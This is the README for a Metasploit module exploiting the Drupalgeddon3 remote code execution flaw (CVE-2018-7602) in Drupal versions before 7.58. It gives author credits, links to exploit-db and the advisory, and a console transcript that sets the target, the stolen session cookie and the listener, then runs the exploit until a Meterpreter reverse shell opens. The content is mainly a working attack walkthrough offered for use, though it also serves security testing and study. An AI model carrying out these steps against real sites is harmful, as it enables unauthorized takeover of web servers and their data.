# Drupal < 7.58 - 'Drupalgeddon3' Authenticated Remote Code Execution (Metasploit)
Author:
- [SixP4ck3r](https://twitter.com/sixp4ck3r) Research and port to MSF
- [Blaklis](https://www.exploit-db.com/exploits/44542/) Initial POC

Metasploit Module for Drupalgeddon 3:
- [https://www.exploit-db.com/exploits/44557/](https://www.exploit-db.com/exploits/44557/)

Original Exploit:
- [exploit-db.com](https://www.exploit-db.com/exploits/44542/)

Drupal Afected Versions & Details:
- [https://www.drupal.org/sa-core-2018-004](https://www.drupal.org/sa-core-2018-004)

Notes:
- CVE-2018-7602 / SA-CORE-2018-004
- A remote code execution vulnerability exists within multiple subsystems of Drupal 7.x and 8.x.
This potentially allows attackers to exploit multiple attack vectors on a Drupal site
Which could result in the site being compromised.
This vulnerability is related to Drupal core - Highly critical - Remote Code Execution

### Example Metasploit
<img src='https://i.imgur.com/9qRHfZ7.png'/>


### Output Metasploit
```bash
six@ub:/opt/metasploit-framework$ ./msfconsole 
[-] ***rting the Metasploit Framework console...|
[-] * WARNING: No database support: No database YAML file
[-] ***
                                                  
 _                                                    _
/ \    /\         __                         _   __  /_/ __
| |\  / | _____   \ \           ___   _____ | | /  \ _   \ \
| | \/| | | ___\ |- -|   /\    / __\ | -__/ | || | || | |- -|
|_|   | | | _|__  | |_  / -\ __\ \   | |    | | \__/| |  | |_
      |/  |____/  \___\/ /\ \\___/   \/     \__|    |_\  \___\


       =[ metasploit v5.0.0-dev-8164379                   ]
+ -- --=[ 1758 exploits - 1006 auxiliary - 306 post       ]
+ -- --=[ 536 payloads - 41 encoders - 10 nops            ]
+ -- --=[ ** This is Metasploit 5 development branch **   ]

msf5 > use unix/webapp/drupal_drupalgeddon3
msf5 exploit(unix/webapp/drupal_drupalgeddon3) > set RHOST 192.168.1.200
RHOST => 192.168.1.200
msf5 exploit(unix/webapp/drupal_drupalgeddon3) > set DRUPAL_SESSION SESSad4467153480b84038526cd43a9ce852=AYyCoZ07NvaDObWxYYEfAOJKETi2atRdEU0B6yEBiRI
DRUPAL_SESSION => SESSad4467153480b84038526cd43a9ce852=AYyCoZ07NvaDObWxYYEfAOJKETi2atRdEU0B6yEBiRI
msf5 exploit(unix/webapp/drupal_drupalgeddon3) > set DRUPAL_NODE 3
DRUPAL_NODE => 3
msf5 exploit(unix/webapp/drupal_drupalgeddon3) > set LHOST 192.168.1.200
LHOST => 192.168.1.200
msf5 exploit(unix/webapp/drupal_drupalgeddon3) > exploit

[*] Started reverse TCP handler on 192.168.1.200:4444 
[*] Token Form -> u73s2UzA1B056tdlItiAfpeolb5OVwLGEF5EAFH0bJY
[*] Token Form_build_id -> form-FtN_yMsgJI9GlviMbemIkYxgJ97xsUZ7Lg2hOtW1IlI
[*] Sending stage (37775 bytes) to 192.168.1.200
[*] Meterpreter session 1 opened (192.168.1.200:4444 -> 192.168.1.200:60156) at 2018-04-29 15:04:33 -0400

meterpreter > 
```
